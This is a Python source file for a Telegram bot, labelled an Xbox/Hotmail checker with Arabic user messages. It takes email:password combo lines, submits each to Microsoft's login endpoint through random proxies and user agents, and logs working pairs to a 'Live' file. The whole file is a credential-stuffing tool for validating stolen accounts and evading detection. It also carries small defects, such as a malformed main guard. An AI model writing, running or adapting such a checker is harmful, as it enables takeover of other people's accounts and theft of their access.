import os
import requests
import random
import time
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ====================== CONFIG FROM RAILWAY ======================
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

if not TOKEN or not ADMIN_ID:
    print("❌ BOT_TOKEN أو ADMIN_ID مش موجودين في Variables")
    exit()

# ====================== SETTINGS ======================
PROXIES_FILE = "proxies.txt"
LIVE_FILE = "Live.txt"
DEAD_FILE = "Dead.txt"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
]

# ====================== CHECK FUNCTION ======================
def check_account(email: str, password: str):
    try:
        session = requests.Session()
        
        # Random Proxy if file exists
        proxy = None
        if os.path.exists(PROXIES_FILE):
            with open(PROXIES_FILE, "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            if proxies:
                p = random.choice(proxies)
                proxy = {"http": p, "https": p}

        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
        }

        data = {
            "i13": "1",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "1",
            "passwd": password,
            "ps": "2",
            "NewUser": "1",
            "fspost": "0",
            "i21": "0",
        }

        r = session.post("https://login.live.com/ppsecure/post.srf", 
                        data=data, 
                        headers=headers, 
                        proxies=proxy, 
                        timeout=20)

        if any(err in r.text.lower() for err in ["doesn't exist", "incorrect", "compte ou mot de passe", "incorrect password"]):
            with open(DEAD_FILE, "a", encoding="utf-8") as f:
                f.write(f"{email}:{password} [DEAD]\n")
            return f"❌ DEAD → {email}"

        # LIVE
        with open(LIVE_FILE, "a", encoding="utf-8") as f:
            f.write(f"{email}:{password} | {datetime.now().strftime('%Y-%m-%d %H:%M')}\n")
        
        return f"✅ LIVE → {email}"

    except Exception as e:
        return f"⚠️ ERROR → {email}"

# ====================== TELEGRAM HANDLERS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ هذا البوت خاص بالأدمن فقط.")
        return
    await update.message.reply_text(
        "🤖 Xbox / Hotmail Checker Bot\n\n"
        "ارسل Combo على شكل:\n"
        "email:password"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ غير مصرح لك باستخدام هذا البوت.")
        return

    text = update.message.text.strip()
    
    if ":" not in text:
        await update.message.reply_text("❌ التنسيق الصحيح: email:password")
        return

    email, password = [x.strip() for x in text.split(":", 1)]
    
    await update.message.reply_text(f"🔄 جاري الفحص → {email}...")
    
    result = check_account(email, password)
    await update.message.reply_text(result)

# ====================== MAIN ======================
if name == "main":
    print("🚀 Xbox Checker Bot Starting...")
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))

    app.run_polling()